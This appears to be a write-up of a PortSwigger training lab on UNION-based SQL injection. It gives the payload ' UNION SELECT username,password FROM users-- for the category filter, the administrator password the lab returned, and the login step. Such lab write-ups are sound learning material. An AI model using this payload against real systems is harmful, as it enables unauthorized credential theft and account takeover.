# SQL Injection UNION Attack — Retrieving Data from Other Tables


**Lab:** SQL injection UNION attack, retrieving data from other tables

**Difficulty:** Practitioner

**Status:** Solved ✅


## 🎯 Goal


Use a **UNION-based SQL injection** to retrieve usernames and passwords from the `users` table, then log in as 

`administrator`.


---


## 1. Information Given by the Lab


The database contains:


```text

Table: users



Columns:

- username

- password

```



The injection point is the **product category filter**.



From the previous lab, we know how to determine the number of columns and use `UNION SELECT`.



---



## 2. Determine the Number of Columns


For this lab, the query returned **2 columns**.



Therefore, our `UNION SELECT` must also return exactly **2 columns**.



---



## 3. Retrieve Usernames and Passwords



Payload:



```sql

' UNION SELECT username,password FROM users--

```



This retrieves both values from the `users` table:



```text

username | password

```


The response returned:


```text

administrator | cb6hgcssc2xad78bnde8

```

---


## 4. Log in as Administrator


Use the retrieved credentials:


```text

Username: administrator

Password: cb6hgcssc2xad78bnde8

```



Login through **My account**.



✅ **LAB SOLVED**



---



## 🧠 Attack Flow



```text

SQL Injection

      ↓

UNION SELECT

      ↓

Determine column count

      ↓

2 columns

      ↓

users table

      ↓

username + password

      ↓

administrator credentials

      ↓

Login

      ↓

LAB SOLVED

```



## 🔑 Key Takeaway



The important rule is:



> **The UNION query must return the same number of columns as the original query.**



Since this lab's query returned **2 columns**, we used:



```sql

' UNION SELECT username,password FROM users--

```



Unlike the previous lab, we didn't need a `NULL` because both required values fit directly into the two available 
columns.

[PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks?utm_source=chatgpt.com)
